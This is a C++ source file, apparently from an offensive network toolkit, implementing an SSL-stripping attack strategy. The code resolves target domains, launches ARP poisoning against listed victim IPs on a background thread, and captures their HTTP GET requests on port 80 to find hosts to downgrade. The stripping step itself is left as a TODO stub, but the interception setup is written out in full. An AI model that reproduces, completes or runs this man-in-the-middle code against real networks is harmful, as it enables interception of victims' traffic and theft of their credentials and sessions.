#include "ssl_stripping/silent.h"
#include "HttpLayer.h"
#include "IPv4Layer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "TcpLayer.h"
#include "arp_poisoning/public.h"
#include "log.h"
#include "ssl_stripping/public.h"
#include <algorithm>
#include <boost/asio.hpp>
#include <boost/system/error_code.hpp> // Required for boost::system::error_code
#include <exception>
#include <future>
#include <stdexcept>
#include <thread>
#include <unordered_set>
#include <vector>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h> // for getaddrinfo, inet_ntop
#pragma comment(lib, "ws2_32.lib")
#else
#include <arpa/inet.h>
#include <cstring>
#include <netdb.h>
#include <unistd.h>
#endif

std::optional<std::unordered_set<std::string>>
resolveDomainToIP(const std::string &domain, const std::string &service) {
    std::unordered_set<std::string> outputIps;
    try {
        boost::asio::io_context ioc;

        boost::asio::ip::tcp::resolver resolver(ioc);

        // Resolve the endpoints against the domain name
        boost::system::error_code
            exc; // To capture errors without throwing exceptions immediately
        boost::asio::ip::tcp::resolver::results_type endpoints =
            resolver.resolve(domain, service, exc);

        if (exc) {
            LOG_ERROR("Boost.Asio resolve failed for " + domain +
                      ". Error message: " + exc.message());
            return std::nullopt; // Return empty list on error
        }

        // Iterate through the resolved endpoints and extract IP addresses
        for (const auto &entry : endpoints) {
            outputIps.insert(entry.endpoint().address().to_string());
        }

    } catch (const boost::system::system_error &e) {
        // Catch boost.asio specific exceptions
        LOG_ERROR("Boost.Asio System Exception during resolution for " +
                  domain + ". Error message: " + e.what() +
                  ". Error code: " + e.code().to_string());
    } catch (const std::exception &e) {
        // Catch other standard exceptions
        LOG_ERROR("Standard Exception during resolution for " + domain +
                  ". Error message: " + e.what());
    }
    return outputIps;
}

void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
    void * /*cookie*/) {
    pcpp::Packet parsedPacket(packet);

    // Check IPv4 layer
    auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipLayer == nullptr) {
        return;
    }

    // Check if destination IP matches some victim IP
    if (std::find(victimIps_.begin(), victimIps_.end(),
                  ipLayer->getDstIPAddress().toString()) == victimIps_.end()) {
        return;
    }

    // Check TCP layer
    auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
    const int HTTP_PORT = 80;
    if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
        return;
    }

    // Access HTTP Layer
    auto *httpRequestLayer =
        parsedPacket.getLayerOfType<pcpp::HttpRequestLayer>();
    if (httpRequestLayer == nullptr) {
        return;
    }

    // Check if method is GET
    if (httpRequestLayer->getFirstLine()->getMethod() !=
        pcpp::HttpRequestLayer::HttpGET) {
        return;
    }

    // Check Host header
    pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
    if (hostField == nullptr) {
        return;
    }

    // Check whether domain is in Host header and start SSL attack if so
    std::string hostValue = hostField->getFieldValue();
    for (const std::string &domain : domainsToStrip_) {
        if (hostValue.find(domain) != std::string::npos) {
            // TODO(Quinn)
        }
    }
}

void ATK::SSL::SilentSslStrippingStrategy::execute() {
    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
        // Initialize options with values based on this call
        ATK::ARP::SilentPoisoningOptions options;
        options.ifaceIpOrName = device_->getName();
        std::unordered_set<std::string> victimIpsSet(victimIps_.begin(),
                                                     victimIps_.end());
        options.victimIps = victimIpsSet;
        std::unordered_set<std::string> ipsToSpoofSet;

        // Get all target IPs from domain
        for (const std::string &domain : domainsToStrip_) {
            std::optional<std::unordered_set<std::string>> currentIps =
                resolveDomainToIP(domain, "https");
            if (currentIps.has_value()) {
                ipsToSpoofSet.insert(currentIps.value().begin(),
                                     currentIps.value().end());
            }
        }
        options.ipsToSpoof = ipsToSpoofSet;

        // Start ARP poison on different thread
        std::thread(ATK::ARP::silentPoison, options).detach();
    } else {
        // TODO(Quinn) implement with DNS once it's available
    }

    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    if (!device_->setFilter("tcp dst port 80")) {
        LOG_ERROR("Cannot set tcp filter");
        device_->close();
        throw std::runtime_error(
            "Unable to set http request filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing http packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
